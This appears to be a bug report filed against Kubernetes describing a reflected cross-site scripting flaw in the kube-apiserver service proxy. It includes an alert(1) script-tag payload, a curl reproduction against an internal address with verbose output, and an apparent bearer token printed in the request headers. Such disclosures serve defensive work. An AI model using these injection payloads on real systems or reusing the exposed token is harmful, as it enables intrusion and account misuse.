body:
**What happened**:

The name of an arbitrarily supplied URL parameter is copied into the HTML document as plain text between tags. The payload cfk88<script>alert(1)</script>y9rri was submitted in the name of an arbitrarily supplied URL parameter. This input was echoed unmodified in the application's response.

This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the response.

The response does not state that the content type is HTML. The issue is only directly exploitable if a browser can be made to interpret the response as HTML.

**What you expected to happen**:

the response should not contain any valid HTML content. Avoid to nject arbitrary JavaScript.

**How to reproduce it (as minimally and precisely as possible)**:

```
# curl -k -H "Authorization:Bearer $ID_TOKEN" https://9.21.55.15:8001/api/v1/namespaces/kube-system/services/platform-identity-provider:4300/proxy/?pagesize=3sms0a%3cscript%3ealert%3c%2fscript%3eid6ct -vvv
*   Trying 9.21.55.15...
* Connected to 9.21.55.15 (9.21.55.15) port 8001 (#0)
* found 148 certificates in /etc/ssl/certs/ca-certificates.crt
* found 592 certificates in /etc/ssl/certs
* ALPN, offering http/1.1
* SSL connection using TLS1.2 / ECDHE_RSA_AES_128_GCM_SHA256
* 	 server certificate verification SKIPPED
* 	 server certificate status verification SKIPPED
* 	 common name: kubernetes-master (matched)
* 	 server certificate expiration date OK
* 	 server certificate activation date OK
* 	 certificate public key: RSA
* 	 certificate version: #3
* 	 subject: CN=kubernetes-master
* 	 start date: Tue, 28 May 2019 08:10:15 GMT
* 	 expire date: Thu, 27 May 2021 08:10:15 GMT
* 	 issuer: C=US,ST=New York,L=Armonk,O=IBM Cloud Private,CN=www.ibm.com
* 	 compression: NULL
* ALPN, server accepted to use http/1.1
> GET /api/v1/namespaces/kube-system/services/platform-identity-provider:4300/proxy/?pagesize=3sms0a%3cscript%3ealert%3c%2fscript%3eid6ct HTTP/1.1
> Host: 9.21.55.15:8001
> User-Agent: curl/7.47.0
> Accept: */*
> Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9..wB5vM2Z7n-MeJtTTdNu2gKzQQfbJiNxktAvHNkWzAYIGr6Yi7os77sqAoLUkepdPdECUpsw9kHAhTN_e4PJp7ytP79cL0tOdqJwTxfyYNowFzH9s9sYRiamKH8C1TTSQyl23G0KbNVI26X-ZaaAsTbZuvSSqpA5EFbYhlUAxVIlSQKNVRN6wV7BzyHVg0qLpyYxFbD27QdrF0pfX3K5AZ7qAf_00C1Q9TCvGIHj8u-3Epz61mb4gmbMpIK2rSaSw8ldMRaRZQHPr-dmmV7PNbqKcn7aCEkC6DeKfOz-tDHBE0oZMjM_n7n4v6SXOfO_RCaXaBygvDdoA45XAj9zuygYUNnYl_FDIXtDHL5UKmPS2L58h-TMGv42q0FADdXUd3PHl4lelSRnTtw9NPj9cPawxK49k-ThSWcnl3iZratcSqj8Ls5d6W-Oc_OodkoosV9SdWcyUPkFzNimAK1H4St-Gjwt7-tOaG5oPuM1Yf-9rPX2aycYzSZN3s80Tp3_H2tTqyjE91eOnTchLEPY-WDO9xTZh7b8SwrsXETuwt-fZI3QHJox_4740elz3DP7eAhNM26gYowMuzIHhZ_8y7aLvMICCjc48EXbIMr3eWheXE4llHFPLFhkCsTjSlGanZMbn5eXL148XDBWBP9Nr58EQSVb6y_EYkEez9tFcVoI
>
< HTTP/1.1 503 Service Unavailable
< Date: Wed, 29 May 2019 07:03:09 GMT
< Transfer-Encoding: chunked
<
Error: 'EOF'
* Connection #0 to host 9.21.55.15 left intact
Trying to reach: 'http://10.1.250.75:4300/?pagesize=3sms0a%3cscript%3ealert%3c%2fscript%3eid6ct'
```

Just make the backend service unreachable. For example, https backend service is only supported.

**Anything else we need to know?**:

**Environment**:
- Kubernetes version (use `kubectl version`): v1.14.2
- Cloud provider or hardware configuration: None
- OS (e.g: `cat /etc/os-release`): Ubuntu 18.04
- Kernel (e.g. `uname -a`):
- Install tools:
- Network plugin and version (if this is a network-related bug):
- Others:

title: Cross Site Scripting (Reflected) vulnerability in kube-apiserver proxy
